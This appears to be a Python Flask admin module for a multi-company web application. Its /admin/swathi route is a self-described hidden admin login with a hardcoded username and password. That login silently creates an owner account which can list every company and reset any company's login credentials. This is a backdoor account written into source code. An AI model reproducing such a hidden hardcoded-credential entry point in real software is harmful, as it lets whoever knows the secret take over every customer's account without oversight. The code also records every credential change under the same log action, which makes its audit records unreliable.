from flask import Blueprint, render_template, request, redirect, url_for, flash
from app.models import Company, User, db, AdminLog
from app.utils import require_roles
from flask_login import login_user, current_user
from werkzeug.security import check_password_hash

admin_bp = Blueprint('admin', __name__, url_prefix='/admin')


@admin_bp.route('/swathi', methods=['GET', 'POST'])
def vruski_login():
    """Hidden admin login. Creates a platform company and admin user if missing.
    Default credentials: Username=Swathi Password=Swathi@1301
    """
    if request.method == 'POST':
        username = request.form.get('username', '').strip()
        password = request.form.get('password', '').strip()

        if username == 'Swathi' and password == 'Swathi@1301':
            # Ensure platform company exists
            platform = Company.query.filter_by(company_name='Platform Admin').first()
            if not platform:
                platform = Company(
                    company_name='Platform Admin',
                    owner_name='Platform Owner',
                    email='admin@platform.local',
                    phone='0000000000',
                    address='Platform',
                    city='N/A',
                    state='N/A',
                    country='N/A',
                    postal_code='00000',
                    is_active=True
                )
                db.session.add(platform)
                db.session.commit()

            # Ensure admin user exists for platform
            admin_user = User.query.filter_by(username='Swathi').first()
            if not admin_user:
                admin_user = User(company_id=platform.id, username='Swathi', role='owner')
                admin_user.set_password('Swathi@1301')
                db.session.add(admin_user)
                db.session.commit()

            login_user(admin_user, remember=True)
            return redirect(url_for('admin.companies_list'))

        flash('Invalid credentials for hidden admin.', 'danger')

    return render_template('admin/swathi_login.html')


@admin_bp.route('/companies')
@require_roles('owner')
def companies_list():
    companies = Company.query.order_by(Company.created_date.desc()).all()
    return render_template('admin/companies_list.html', companies=companies)


@admin_bp.route('/companies/<int:company_id>/edit', methods=['GET', 'POST'])
@require_roles('owner')
def edit_company_login(company_id):
    company = Company.query.get_or_404(company_id)
    user = User.query.filter_by(company_id=company.id).first()

    # fetch recent admin logs for this company
    logs = AdminLog.query.filter_by(company_id=company.id).order_by(AdminLog.created_date.desc()).limit(50).all()

    if request.method == 'POST':
        username = request.form.get('username', '').strip()
        password = request.form.get('password', '').strip()

        if not username:
            flash('Username is required.', 'danger')
            return redirect(url_for('admin.edit_company_login', company_id=company.id))

        # Check username uniqueness (allow current user's username)
        existing = User.query.filter(User.username == username).first()
        if existing and (not user or existing.id != user.id):
            flash('Username already taken.', 'danger')
            return redirect(url_for('admin.edit_company_login', company_id=company.id))

        if not user:
            user = User(company_id=company.id, username=username)
            if password:
                user.set_password(password)
            db.session.add(user)
        else:
            user.username = username
            if password:
                user.set_password(password)

        db.session.commit()

        # write an admin log
        try:
            performer_id = current_user.id if current_user and hasattr(current_user, 'id') else None
            action = 'create_user' if not user else 'update_credentials'
            details = f'username={username}'
            log = AdminLog(company_id=company.id, performed_by=performer_id, action=action, details=details)
            db.session.add(log)
            db.session.commit()
        except Exception:
            # do not block on logging
            db.session.rollback()
        flash('Login credentials updated successfully.', 'success')
        return redirect(url_for('admin.companies_list'))

    return render_template('admin/edit_company.html', company=company, user=user, logs=logs)